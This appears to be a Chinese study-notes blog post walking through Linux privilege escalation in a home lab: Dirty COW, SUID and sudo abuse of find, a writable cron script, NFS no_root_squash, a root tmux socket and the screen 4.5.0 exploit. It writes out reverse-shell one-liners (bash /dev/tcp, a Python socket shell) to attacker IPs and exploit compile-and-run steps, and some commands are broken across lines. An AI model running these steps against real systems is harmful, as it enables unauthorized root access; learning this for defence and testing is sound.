# 提权学习之旅-linux系统
上次学习了Windows操作系统的提权以及相关工具的利用，这次就来学习一下Linux操作系统的提权

## Linux提权基础

### Linux提权方法

大致归纳总结如下：  
[![](_v_images/20200820082049862_3710.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811112426-28bfa4ec-db82-1.png)  
不过最核心也是最常见的提取方法还是内核提权，其他大多与程序员的配置有关，出现的几率不是很高。攻击者们选择的下手点也是略有不同，以下列举了Linux权限提升攻击者最为常见的下手点，如：

1.   内核漏洞
2.   定时任务
3.   Suid文件
4.   Sudo 配置错误
5.   NFS共享
6.   第三方服务
基于以上的下手点，在攻击者的视角下，可谓如“探囊取物”一般。但是在普通的IT运维人的视角中，这些“下手点”功能显得非常普通。下面将基于这些下手点逐一进行安全漏洞的介绍与还原。
从普通权限到root权限的思路，基本总结如下：

1.通过查看内核版本，寻找是否存在可以利用的提权EXP。
2.通过信息收集，查看定时任务，sudo配置，suid权限的文件，查看是否可以利用。
3.通过查看系统的应用，或者第三方应用，查找服务本身是否存在问题，或者是否配置存在问题，如大家常见的mysql udf提权。

### Linux提权基础知识

uname -a
查看内核版本
id
显示用户的ID，以及所属群组的ID
pwd
显示当前路径
dpkg -l
rpm -qa
查看已经安装的程序
cat /etc/issue
cat /etc*/*-release*
*查看发行版*

密码权限

> 大部分Linux系统的密码都和`/etc/passwd`和`/etc/shadow`这两个配置文件有关，`passwd`里面储存的是用户，`shadow`里面存储的是密码的hash值。出于安全考虑passwd是全用户可读，root可写的，而shadow是仅root可读写的。

`/etc/passwd`  
[![](_v_images/20200820082049043_20812.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811112809-adeab8f0-db82-1.png)  
passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面.

`/etc/shadow`  
[![](_v_images/20200820082048331_17806.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811112827-b875037a-db82-1.png)  
shadow里面的就是密码的hash，但只有root权限才可以查看。

密码复用

另外需要注意的是很多管理员会重复使用密码，所以有可能数据库或者web后台的密码就是root密码。

提权常见的流程

1. `wget http://exp/exp.c`
    
    下载exp文件
    
2. `gcc -o exp exp.c`
    
    利用gcc进行编译操作，编译成二进制文件
    
3. `chmod +x exp`
    
    将exp更改为可执行权限
    
4. `./exp`

运行exp进行提权

### Linux反弹shell

Linux一般拿到`shell`，权限基本都很低,而且在菜刀或其他工具中执行命令没有交互过程（在菜刀等工具中，只是输入返回内容，如在菜刀中执行`ssh`等命令就不可行），所以需要通过反弹shell拥有一个交互式的shell。

准备环境

ubuntu + apache
kail 192.168.186.134
ubuntu 192.168.186.152

上传进去一个`php`一句话木马，菜刀连接  
[![](_v_images/20200820082047520_25904.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811112855-c8fc09aa-db82-1.png)  
查看当前权限  
[![](_v_images/20200820082047007_13167.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811112911-d2f560c8-db82-1.png)  
下面就使用反弹shell的方法获取到交互式shell

第一种方法：

> 利用最经典也是最常用的方法进行反弹shell，另外反弹shell时设置的端口最好是常用端口，不常用的端口可能会被防火墙给拦截掉。

先进行本地进行监听:
nc -lvp 53
然后在拿到shell的机器上执行:
bash -i >& /dev/tcp/192.168.186.134/53 0>&1

但是执行失败了，没有权限  
[![](_v_images/20200820082046398_17696.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811112956-ed765e02-db82-1.png)

第二种方法：

利用python脚本进行反弹shell，要将脚本上传到服务器上就要找一个低权限用户可以上传且可以执行的目录，一般在`tmp`或者`/var/tmp`中就有这样的权限  
[![](_v_images/20200820082045690_7414.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113017-fa3ebc60-db82-1.png)  
[pyshell](https://github.com/wantongtang/pyshell)

使用方法:
本地监听 ：nc -l -p 53 -vv
目标机器执行：python back.py 192.168.186.134 53

[![](_v_images/20200820082045181_17958.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113034-04671cdc-db83-1.png)

反弹成功，这样就形成了一个交互式的shell，方便下一步的进行

如果在使用python文件没有权限时，使用如下命令即可,因为该文件是当前用户上传进去的，拥有修改的权限。

chmod 777 back.py

[![](_v_images/20200820082044166_4958.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113048-0cb05b24-db83-1.png)

### 脏牛提权

> `Dirty COW，CVE-2016-5195`，攻击者可利用该漏洞本地以低权限提升到root权限。Dirty COW 是一个特权升级漏洞，可以在每个`Linux发行版`中找到。这个漏洞的特别之处在于，防病毒和安全软件无法检测，一旦被利用，根本无从知晓。

漏洞在全版本Linux系统(Linux kernel >= 2.6.22)均可以实现提权
如果内核版本低于列表里的版本，表示还存在脏牛漏洞
Centos7 /RHEL7    3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10         4.8.0-26.28
Ubuntu 16.04         4.4.0-45.66
Ubuntu 14.04         3.13.0-100.147
Debian 8                3.16.36-1+deb8u2
Debian 7                3.2.82-1

[exp地址](https://github.com/FireFart/dirtycow)

在反弹shell成功的基础上继续来做

先来看一下操作系统的版本，低于列表里的版本即存在脏牛漏洞

uname -r

通过`/etc/passwd`了解到超级管理员是root  
[![](_v_images/20200820082043656_1985.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113104-15ccc5b2-db83-1.png)  
查看下当前用户的id  
[![](_v_images/20200820082042948_11942.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113115-1c781c5e-db83-1.png)  
下载exp文件

wget https:*//github.com/FireFart/dirtycow/blob/master/dirty.c*

可以看exp中的说明来执行命令  
[![](_v_images/20200820082042238_14927.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113145-2e57da7c-db83-1.png)  
先通过gcc来编译dirty.c文件

gcc -pthread dirty.c -o dirty -lcrypt

[![](_v_images/20200820082041727_19959.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113203-392ce870-db83-1.png)  
编译好的dirty文件，替换root用户

./dirty

成功替换掉了原来的root用户，提权成功。  
[![](_v_images/20200820082040717_17532.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113221-43d991b0-db83-1.png)  
脏牛提权除下这个exp，还有其他的，例如：`CVE-2016-5195`，具体就不在演示了，按照说明即可，注意文件名不对，自己改下就好。  
[![](_v_images/20200820082039804_13411.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113232-4ac183e8-db83-1.png)

## Linux提权实战

### Linux分析工具

#### Linux-exploit-suggester

给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。

下载地址：

```
https://github.com/mzet-/linux-exploit-suggester
```

1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：

```
chmod +x linux-exploit-suggester.sh  
./linux-exploit-suggester.sh

```
执行命令即可  
[![](_v_images/20200820082039188_12395.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113259-5a8f9a80-db83-1.png)  
这样就将存在的漏洞呈现了出来，利用exp提权即可，非常方便.

![](_v_images/20200820083249379_19730.jpeg)

查看脚本执行结果，可以使用脏牛来进行提权。

![](_v_images/20200820083248853_7946.jpeg)

2.使用searchsploit 搜索dirty,使用40839.c,将漏洞利用代码上传到目标机器。

![](_v_images/20200820083248544_2463.jpg)

3.接下来编译并执行。

`gcc -pthread 40839.c -o c -lcrypt  
./c
`
![](_v_images/20200820083248235_26307.jpeg)

![](_v_images/20200820083247726_1199.jpeg)

4.该漏洞利用代码会加入一个uid为0的用户，切换到firefart用户，获取root权限。

![](_v_images/20200820083247417_15009.jpeg)





#### Searchsploit

> Searchsploit通过本地的exploit-db， 查找软件漏洞信息

使用方法：

`searchsploit`

[![](_v_images/20200820082038474_19842.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113319-6648d1c0-db83-1.png)

如需查看CentOS 7 内核版本为3.10的内核漏洞

searchsploit centos 7 kernel 3.10

[![](_v_images/20200820082037863_5487.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113342-73eaa22c-db83-1.png)

知道该内核版本下存在哪些漏洞即可进行提权操作

### SUID提权

#### 什么是SUID

> 在Linux中，存在suid、guid、sticky，SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。

如果想要为文件附上这样的权限命令：

```
chmod u+s
chmod 4755

```
（有`s`标志位便是拥有SUID权限）

具体的话大致理解就是通过拥有SUID权限二进制文件或程序可以执行命令等，从而进行root提权操作  
[![](_v_images/20200820082036749_15536.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113404-81396f08-db83-1.png)  
查找符合条件的文件

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

[![](_v_images/20200820082036041_14730.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113421-8b4e5f6c-db83-1.png)  
上面的所有二进制文件都可以在root权限下运行，因为属主是root，且权限中含有s

下面就以find命令来实践一下，首先要给find设当SUID权限

```
chmod u+s /usr/bin/find
```

[![](_v_images/20200820082035330_25338.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113438-95779170-db83-1.png)  
如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。

当前用户为  
[![](_v_images/20200820082034722_30228.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113503-a48c6d16-db83-1.png)  
随便找一个文件主要是为了执行后面的命令

```
/usr/bin/find pass.txt -exec whoami \;
```

[![](_v_images/20200820082034415_4866.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113516-ac5befbc-db83-1.png)  
提权成功，接下来以root用户的身份反弹shell

```
/usr/bin/find pass.txt -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.186.150",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);' \;

```
[![](_v_images/20200820082033706_5424.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113542-bbe431ec-db83-1.png)  
如果出现如下错误，关闭两边的防火墙即可  
[![](_v_images/20200820082032996_1886.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113552-c1e9a59a-db83-1.png)  
反弹shell成功，当然还有其他命令可以进行提权，前提是要有SUID权限，这里就不再举例了。
#### 漏洞复现
使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。

该脚本的下载地址：

https://github.com/rebootuser/LinEnum

执行LinEnum之后，发现/bin/screen-4.5.0这个应用有SUID权限，然后去搜索一下，发现screen 4.5版本存在本地提权漏洞。

![](_v_images/20200820083639136_19814.jpeg)

该EXP下载地址如下：

```
https://www.exploit-db.com/exploits/41154
```

使用如下命令进行编译：
```

gcc -fPIC -shared -ldl -o /tmp/

libhax.so /tmp/libhax.c  
gcc -o /tmp/rootshell /tmp/rootshell.c
```

![](_v_images/20200820083638512_19277.jpeg)

![](_v_images/20200820083638204_3509.jpeg)

将编译好的EXP上传到目标机器，并按以下步骤执行。

```
cd /etc  
  
umask 000  
  
/bin/screen-4.5.0 -D -m -L ld.so.

preload echo -ne "x0a/tmp/libhax.so"  
  
/bin/screen-4.5.0 -ls  
  
/tmp/rootshell
```

执行之后成功获取root权限。

![](_v_images/20200820083637894_11348.jpeg)

### 历史记录提权

> 通过查看历史记录，查看是否有有用的信息，有的管理员为了方便登陆mysql或其他软件时，不经意间加上参数`-p`,从而将密码暴露出来或者一些`.sh`脚本连接mysql、vpn等，查看对应的配置文件即可拿到账号密码

cat ~/.bash_history
保存了当前用户使用过的历史命令

[![](_v_images/20200820082032287_29183.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811114418-ef3b0812-db84-1.png)  
如果拿到数据库的账号密码，有可能就是root密码

### 计划任务提权

> 系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出

```
ls -l /etc/cron*
```

[![](_v_images/20200820082031678_12088.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113627-d6ccc190-db83-1.png)  
默认这些程序是以root权限执行，如果有任意用户可写的脚本，我们就可以修改脚本等回连rootshell了。
#### 漏洞复现

接下来使用pspy来监听进程。

pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。

该工具的下载地址：

`https://github.com/DominicBreuker/pspy`

首先将pspy上传到目标机器：

```
chmod +x pspy64s
./pspy64
```

观察一段时间，发现test.py为root权限执行。

![](_v_images/20200820083446308_5858.jpeg)

![](_v_images/20200820083445786_14481.jpeg)

查看test.py权限为普通用户可写，然后执行如下命令，将/etc/passwd设置为所有用户可写。

```
echo 'import os,stat ;os.chmod("/etc/passwd", stat.S\_IRWXU|stat.S\_IRWXG|stat.S_IRWXO)' >> test.py
```

![](_v_images/20200820083445478_16138.jpeg)

Linux操作系统下的passwd文件如果具备可写入权限情况下，可以新建UID为0的用户，或者替换root密码，则可以获取到root权限。

![](_v_images/20200820083444968_14365.jpeg)
### 配置错误引发提权

手动找如果对Linux系统不熟悉的话基本是找不到的，所以可以利用工具去查找  
unix-privesc-check：[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
linuxprivchecker： [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)

[![](_v_images/20200820082030746_13235.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200811113643-e05025e0-db83-1.png)

检查了非常多的配置问题，而且还列出了所有的可写文件，如果找到有配置问题的便可以进行提权操作。
### Sudo配置错误 -suid

漏洞介绍

如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。

管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。

一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道'find'命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。


#### 漏洞复现

拿到普通用户权限之后，使用sudo –l查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。

/usr/bin/find /home –exec sh –i ;

![](_v_images/20200820083840238_776.jpg)

  

### NFS提权  

漏洞介绍

网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。

Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ *nfsnobody* ”，该用户具有最小的本地权限。如果 no_*root_squash* 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。

如下图所示，该共享可以被远程root连接并读写，并且具有root权限，所以可以添加bash文件并赋予SUID权限，在目标机器的普通用户权限下可以执行bash文件，获取root权限。

![](_v_images/20200820083839928_18024.jpg)

  

#### 漏洞复现


如下图所示，该机器开启了/home目录的共享。

![](_v_images/20200820083839619_1305.jpeg)

使用本地root权限将远程共享挂载到本地，将/bin/sh上传到目标机器，并赋予SUID权限。

![](_v_images/20200820083839109_22200.jpg)

使用普通用户执行./sh –p 可以获取root权限。

![](_v_images/20200820083838799_12808.jpg)

  

### 第三方组件提权  

漏洞介绍

某些程序使用root权限启动，如果第三方服务或者程序存在漏洞或者配置问题，可以被利用来获得root权限。

#### 漏洞复现

如下图以tmux为例，通过查看进程，发现tmux以root权限启动。

(tmux是一个终端多路复用器：它使从单个屏幕创建，访问和控制多个终端成为可能。)

因为现在运行的这个tmux是root权限，只要连接到当前这个tmux，就可以获取到root权限。

![](_v_images/20200820083838290_31185.jpg)

通过查看历史命令记录可以发现，tmux 通过了-S参数指定了socket的路径。

![](_v_images/20200820083837881_3186.jpeg)

![](_v_images/20200820083837256_31978.jpeg)

使用相同的方式连接SOCKET就可以获取root权限。

tmux -S /.devs/dev_sess

![](_v_images/20200820083836948_23104.jpg)

![](_v_images/20200820083836432_15612.jpeg)

## 总结

经过这次学习，简单的算是对Linux提权有了一定的了解，但还有很多姿势需要去学习，还是需要不断去积累。

## 参考博客

[https://www.cnblogs.com/BOHB-yunying/articles/11517748.html](https://www.cnblogs.com/BOHB-yunying/articles/11517748.html)  
[https://www.cnblogs.com/hookjoy/p/6612595.html](https://www.cnblogs.com/hookjoy/p/6612595.html)
